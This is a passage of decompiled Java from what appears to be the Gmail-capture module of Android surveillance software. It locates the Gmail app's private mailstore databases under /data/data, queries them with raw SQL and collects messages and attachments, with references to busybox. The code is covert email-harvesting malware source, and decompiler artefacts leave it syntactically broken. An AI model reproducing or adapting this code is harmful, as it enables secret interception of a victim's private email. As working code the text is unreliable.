    Object localObject3 = Integer.valueOf(paramInt);
    localObject2[i] = localObject3;
    Object localObject4 = String.format("SELECT %s.%s AS mid, %s.%s AS m_label_id,* FROM %s LEFT JOIN %s ON %s = %s LEFT JOIN %s ON %s = %s.%s WHERE (%s = '%s' OR %s = '%s') AND %s = 0 ORDER BY %s DESC LIMIT %d", (Object[])localObject2);
    localObject2 = null;
    for (;;)
    {
      try
      {
        localCursor = ((SQLiteDatabase)localObject1).rawQuery((String)localObject4, null);
        if (localCursor != null)
        {
          bool2 = localCursor.moveToNext();
          if (bool2)
          {
            localObject4 = paramString2;
            localObject2 = paramd;
            localObject3 = paramString4;
            localObject4 = a((SQLiteDatabase)localObject1, paramString2, localCursor, paramd, paramString3, paramString4);
            localArrayList.add(localObject4);
            continue;
          }
        }
      }
      catch (Exception localException)
      {
        boolean bool2 = c;
        if ((!bool2) || (localCursor != null)) {
          localCursor.close();
        }
        if (localObject1 != null) {
          ((SQLiteDatabase)localObject1).close();
        }
        localObject1 = localArrayList;
        break;
      }
      finally
      {
        if (localCursor != null) {
          localCursor.close();
        }
        if (localObject1 != null) {
          ((SQLiteDatabase)localObject1).close();
        }
      }
      if (localCursor != null) {
        localCursor.close();
      }
      if (localObject1 == null) {}
    }
  }
  
  public static HashSet a(String paramString)
  {
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    File localFile = new java/io/File;
    localFile.<init>(paramString);
    boolean bool1 = localFile.exists();
    if (bool1)
    {
      bool1 = localFile.isDirectory();
      if (bool1)
      {
        String[] arrayOfString = localFile.list();
        if (arrayOfString != null)
        {
          int i = arrayOfString.length;
          if (i > 0)
          {
            Pattern localPattern = Pattern.compile("(mailstore){1}(.)*(.db){1}");
            int j = arrayOfString.length;
            i = 0;
            localFile = null;
            while (i < j)
            {
              String str = arrayOfString[i];
              Matcher localMatcher = localPattern.matcher(str);
              boolean bool2 = localMatcher.find();
              if (bool2)
              {
                bool2 = com.vvt.p.c.a(str);
                if (bool2)
                {
                  int k = localMatcher.start();
                  int m = localMatcher.end();
                  k += 10;
                  m += -3;
                  str = str.substring(k, m);
                  localHashSet.add(str);
                }
              }
              i += 1;
            }
          }
        }
      }
    }
    return localHashSet;
  }
  
  private static List a(SQLiteDatabase paramSQLiteDatabase, String paramString1, long paramLong, String paramString2, String paramString3)
  {
    int i = 1;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    int j;
    BufferedReader localBufferedReader;
    Object localObject1;
    if (paramString1 != null)
    {
      j = paramString1.length();
      if (j > 0)
      {
        localBufferedReader = new java/io/BufferedReader;
        localObject1 = new java/io/StringReader;
        ((StringReader)localObject1).<init>(paramString1);
        localBufferedReader.<init>((Reader)localObject1);
      }
    }
    for (;;)
    {
      Object localObject3;
      try
      {
        localObject3 = localBufferedReader.readLine();
        if (localObject3 != null)
        {
          j = 0;
          localObject1 = null;
          boolean bool2 = a;
          if (bool2) {}
          String str1 = "|";
          String str2 = " ";
          localObject3 = ((String)localObject3).replace(str1, str2);
          str1 = " ";
          localObject3 = ((String)localObject3).split(str1);
          if (localObject3 == null) {
            continue;
          }
          int k = localObject3.length;
          if (k <= i) {
            continue;
          }
          k = 0;
          str1 = null;
          str1 = localObject3[0];
          str1 = a(paramSQLiteDatabase, paramLong, str1);
          boolean bool3 = true;
          localObject3 = localObject3[bool3];
          bool3 = com.vvt.ag.b.a(str1);
          if (!bool3)
          {
            localObject1 = "/";
            j = str1.lastIndexOf((String)localObject1) + 1;
            localObject1 = str1.substring(j);
            str1 = a(paramString2, str1, (String)localObject1, paramString3);
          }
          bool3 = com.vvt.ag.b.a((String)localObject3);
          if (bool3)
          {
            localObject3 = new com/vvt/capture/email/a;
            ((com.vvt.capture.email.a)localObject3).<init>();
            ((com.vvt.capture.email.a)localObject3).a((String)localObject1);
            ((com.vvt.capture.email.a)localObject3).b(str1);
            localArrayList.add(localObject3);
          }
        }
        else
        {
          boolean bool1;
          return localArrayList;
        }
      }
      catch (IOException localIOException)
      {
        bool1 = c;
        if (!bool1) {}
      }
      Object localObject2 = localObject3;
    }
  }
  
  public static String[] b()
  {
    int i = 2;
    int j = 1;
    String[] arrayOfString = new String[4];
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[j] = "com.google.android.providers.gmail";
    String str = String.format("%s/%s/databases", arrayOfObject);
    arrayOfString[0] = str;
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[j] = "com.google.android.gm";
    str = String.format("%s/%s/databases", arrayOfObject);
    arrayOfString[j] = str;
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "/dbdata/databases";
    arrayOfObject[j] = "com.google.android.providers.gmail";
    str = String.format("%s/%s", arrayOfObject);
    arrayOfString[i] = str;
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "/dbdata/databases";
    arrayOfObject[j] = "com.google.android.gm";
    str = String.format("%s/%s", arrayOfObject);
    arrayOfString[3] = str;
    return arrayOfString;
  }
  
  private static String[] b(String paramString)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    int i;
    Object localObject;
    if (paramString != null)
    {
      i = paramString.length();
      if (i > 0)
      {
        i = 0;
        localObject = null;
      }
    }
    for (;;)
    {
      String str = "<";
      int j = paramString.indexOf(str, i) + 1;
      i = 1;
      if (j >= i)
      {
        i = paramString.length();
        if (j <= i) {
          break label74;
        }
      }
      label74:
      int k;
      do
      {
        do
        {
          localObject = new String[0];
          return (String[])localArrayList.toArray((Object[])localObject);
          localObject = ">";
          i = paramString.indexOf((String)localObject, j);
        } while (i < 0);
        k = paramString.length();
      } while (i > k);
      str = paramString.substring(j, i);
      localArrayList.add(str);
    }
  }
  
  private static String[] c(String paramString)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    int i;
    Object localObject;
    if (paramString != null)
    {
      i = paramString.length();
      if (i > 0)
      {
        i = 0;
        localObject = null;
      }
    }
    for (;;)
    {
      String str = "\"";
      i = paramString.indexOf(str, i) + 1;
      int j = 1;
      if (i >= j)
      {
        j = paramString.length();
        if (i <= j) {
          break label75;
        }
      }
      label75:
      int k;
      do
      {
        do
        {
          localObject = new String[0];
          return (String[])localArrayList.toArray((Object[])localObject);
          str = "\"";
          j = paramString.indexOf(str, i);
        } while (j < 0);
        k = paramString.length();
      } while (j > k);
      if (i <= j)
      {
        localObject = paramString.substring(i, j);
        localArrayList.add(localObject);
      }
      i = j + 1;
    }
  }
  
  private static String d(String paramString)
  {
    return p.a(paramString, "gm_att");
  }
  
  private static String e(String paramString)
  {
    return p.a(paramString, "busybox");
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/gmail/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */